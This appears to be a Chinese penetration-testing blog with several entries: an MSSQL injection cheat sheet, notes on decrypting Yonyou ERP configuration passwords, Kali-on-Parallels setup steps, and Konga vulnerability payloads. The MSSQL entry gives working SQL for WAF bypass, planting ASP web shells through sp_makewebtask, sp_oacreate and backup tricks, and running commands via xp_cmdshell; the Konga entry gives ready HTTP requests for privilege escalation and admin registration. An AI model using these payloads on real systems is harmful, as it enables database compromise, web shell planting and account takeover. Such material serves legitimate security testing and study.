entry.title: Mssql利用笔记
entry.content:
常用

host_name() @@servername @@version  db_name();declare @d int and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--检测XP_DIRTREE读子目录：and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_dirtree') #dirtree 得使用指定列  创建表得用这个字段subdirectory1;exec/*(*/myexec 0x73656c65637420636f6e7665727428696e742c404076657273696f6e29execute 绕waf

IIS配置文件

默认iis目录 C:/Inetpub/wwwroot> C:\WINDOWS\system32\LogFiles\HTTPERR\httperr1.logwindows2003 C:\Windows/system32\inetsrv\metabase.xml  win2008/2012  C:\Windows\System32\inetsrv\config\applicationHost.config

写文件

有杂质写文件之备份、差异备份 backup database

有杂质写文件之日志备份 backup log

有杂质写文件之xp_makewebtask

无杂质写文件之Ole Automation Procedures调用ADODB.Stream

存储过程写文件之SP_OACreate调用scripting.filesystemobject对象

sp_makewebtask写文件

适用于SQL Server2008以前版本,2008被移除

declare @s nvarchar(4000);select @s=0x730065006c00650063007400200027003c00250045007800650063007500740065002800720065007100750065007300740028002200610022002900290025003e000d000a002700;exec sp_makewebtask 0x43003a005c007a00770065006c006c002e00610073007000, @s;
exec sp_makewebtask 'c:\www\testwr.asp','select''<%execute(request("a"))%>'' '

存储过程写文件 - scripting.filesystemobject

declare @o int, @f int, @t int, @ret intexec sp_oacreate 'scripting.filesystemobject', @o outexec sp_oamethod @o, 'createtextfile', @f out, 'c:\inetpub\cbd.asp', 1exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'

log备份 - backup log

体积小，public权限即可

alter database 库名 set RECOVERY FULLcreate table cmd (a image)backup log 库名 to disk = 'c:\' with initinsert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E)backup log 库名 to disk = 'c:\2.asp'

差异备份写文件 - backup database

体积大，public权限即可

backup database 库名 to disk = 'c:\bak.bak';create table [dbo].[test] ([cmd] [image]);insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)backup database 库名 to disk='C:\d.asp' WITH DIFFERENTIAL,FORMAT;

中文路径差异备份

1、将中文要备份到的路径转换为l6进制用下面的代码即可select CONVERT(VARBINARY(1000),'E:\迅雷下载\2.asp')/*字符串转16*/这个是将16进制转换为字符串SELECT CONVERT(VARCHAR,CONVERT(VARBINARY(50), 0x453a5ce8bf85e99bb7e4b88be8bdbd5c322e617370))/*16转字符串*/2、关键备份代码DECLARE @diskpath varchar(50)SET @diskpath=CONVERT(VARCHAR,CONVERT(VARBINARY(50), 0x453A5CD1B8C0D7CFC2D4D85C322E617370))backup database 这里是你的数据库名称 to disk=@disk 上面三行代码的第一行是定义一个变量 第二行是给变量赋值里面的16进制字符串0x453a5ce8bf85e99bb7e4b88be8bdbd5c322e617370为E:\迅雷下载\2.asp然后第三行执行备份

执行命令

xp_cmdshell

SP_OACreate

此方式执行是无回显的

  1. wscript.shell
  2. Shell.Application

CLR

列目录 xp_dirtree

execute master..xp_dirtree ‘ver’

注册表

ref

entry.title: 用友N8C-ERP密码解密
entry.content:
配置文件

文件存放位置：L:\U8CERP\ierp\bin\prop.xml

看起来挺像正常的明文密码2333

密码解密

解密方法：L:\U8CERP\middleware\mw.jar -> decode()

文件太杂直接全局搜索nc.vo.framework.rsa;，发现藏在U8CERP\external\lib\basic.jar里

idea把这两个jar包导入，直接解密（用户密码也一样的加密）。

entry.title: Parallels安装kali折腾笔记
entry.content:
Parallels安装kali折腾笔记

安装版本：

kali-linux-2020.2-installer-amd64.iso
Parallels 16.0.1

Change Aliyun source

nano /etc/apt/sources.list 

#deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib#deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib

Update Soft

apt-get cleanapt-get updateapt-get upgrade -yapt-get dist-upgrade -yapt-get install dkms kpartx printer-driver-postscript-hp

Install Parallels Tools

sudo -seject /dev/cdrom 然后挂载toolsmkdir /media/ptmkdir /root/Desktop/ptmount /dev/cdrom /media/ptcp -r /media/pt/  /root/Desktop/ptcd /root/Desktop/pt/pt./install

无法安装linux-headers

接下来的错误都是要查看日志文件了cat /var/log/parallels-tools-install.log如果是无法安装linux-headers的话，就要手动安装。 先查看内核版本uname -a然后来这里http://http.kali.org/kali/pool/main/l/linux/下载三个对应内核版本的安装包手动安装国内使用aliyun下载更快 https://mirrors.aliyun.com/kali/pool/main/l/linux/linux-kbuild: linux-kbuild-xxxx_amd64.deblinux-header-common: linux-headers-xxxx-common_xxxx_amd64.deblinux-compiler-gcc: linux-compiler-gcc-xxx-amd64.deblinux-headers: linux-headers-xxxx_amd64.deb下载完成后，用dpkg命令安装deb包。dpkg -i xxxxx.deb

装完Tools后登陆白屏问题解决

关闭3D加速

参考

https://www.sqlsec.com/2019/12/pd.html

https://cloud.tencent.com/developer/article/1561336

https://forum.parallels.com/threads/how-to-install-the-parallels-tools-on-kali-linux.348342/

entry.title: Konga 漏洞
entry.content:
Konga 漏洞

简介

github：https://github.com/pantsel/konga

越权漏洞普通用户提升管理用户

利用条件：需账号一枚
links：
https://github.com/pantsel/konga/issues/695
https://github.com/pantsel/konga/issues/694

Payload

PUT /api/user/21 HTTP/1.1Host: test.konga.oa.comContent-Type: application/json;charset=utf-8 Content-Length: 226{    "admin": true,    "passports": {        "password": "1234@abcd!",        "protocol": "local"    },    "password_confirmation": "1234@abcd!",    "token": "eyJhbGciOiJIUzI1NiJ9.MjE.JSGF5Y5dU6zBaCkGaHQFjKlsTCXkf9_kfxiDSIMF6LI"}

前台注册管理员用户

利用条件：默认开放注册，直接发送请求即可
links: https://github.com/pantsel/konga/issues/555

Payload ：

POST /register HTTP/1.1Host: xx.qq.comConnection: closeAccept: application/json, text/plain, */*Sec-Fetch-Dest: emptyconnection-id: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36Origin: https://xx.qq.comSec-Fetch-Site: same-originSec-Fetch-Mode: corsReferer: https://xx.qq.com/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Length: 106{"username":"admintest","email":"testa@qq.com","password":"qqAAwiqk1","password_confirmation":"qqAAwiqk1"}
